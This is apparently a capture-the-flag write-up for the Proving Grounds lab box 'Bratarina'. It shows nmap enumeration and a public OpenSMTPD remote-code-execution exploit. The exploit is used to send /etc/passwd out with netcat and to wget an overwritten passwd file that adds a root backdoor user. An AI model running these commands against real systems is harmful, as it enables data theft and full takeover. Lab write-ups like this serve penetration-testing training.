---
layout: post
title: Proving Grounds - Bratarina
date: 2020-10-17 12:16:22 +0100
description: Bratarina is an easy Linux box featuring an outdated installation of an SMTP server.
img: os.jpeg
fig-caption: Bratarina
categories: ProvingGrounds
tags: [Easy, Linux, Practice, CVE]
---
## Overview
Bratarina is an easy Linux box featuring an outdated installation of an SMTP server.

## Enumeration
The initial scan reveals a fair number of open ports
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ sudo nmap -T4 -p- 192.168.200.71 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 22:30 BST
Nmap scan report for 192.168.200.71
Host is up (0.091s latency).
Not shown: 65530 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds
```
After some initial enumeration it becomes clear that the web server is a dead end. The website appeared broken, and fuzzing and a nikto scan revealed nothing of interest. The samba share contained a backup of the passwd file, but after checking the version, did not appear to be vulnerable. The final remaining port appeared to be the smtp server running on port 25. Service enumeration failed to identify the version number, but did show the name of the server, which after querying searchsploit did reveal that at least a particular version of it was vulnerable.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ nmap -p25 --script smtp-commands 192.168.200.71
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 22:38 BST
Nmap scan report for 192.168.200.71
Host is up (0.091s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.200], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
```
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ searchsploit opensmtpd
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                               | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                           | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution           | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                  | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution               | openbsd/remote/48140.c
--------------------------------------------------------------------------------------- ---------------------------------

```
## Foothold
Browsing through the results from searchsploit, the python script appears promising as it offers remote code execution, does not require metasploit and the target server likely does not run on OpenBSD. Testing the script to see if we can receive output proves succesful
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ ./47984.py 192.168.200.71 25 'nc -nv 192.168.49.200 80 < /etc/passwd'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```
Although it proved difficult to receive a reverse shell, although there would be many ways to handle this, I opted to create a backdoor user on the box.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ mkpasswd --method=MD5 --stdin    
Password: pass
$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1
```
I added this as an entry to the passwd file and used wget to place it into /etc/passwd
```
test:$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1:0:0:Test,,,:/root
```
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ ./47984.py 192.168.200.71 25 'wget -O /etc/passwd 192.168.49.200/passwd.bak'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```
Having done that, we can now ssh onto the box unimpeded
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/Bratarina]
└─$ ssh test@192.168.200.71
test@192.168.200.71's password:
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
## Privilege Escalation

Privilege escalation is not required as we got a root shell directly from the foothold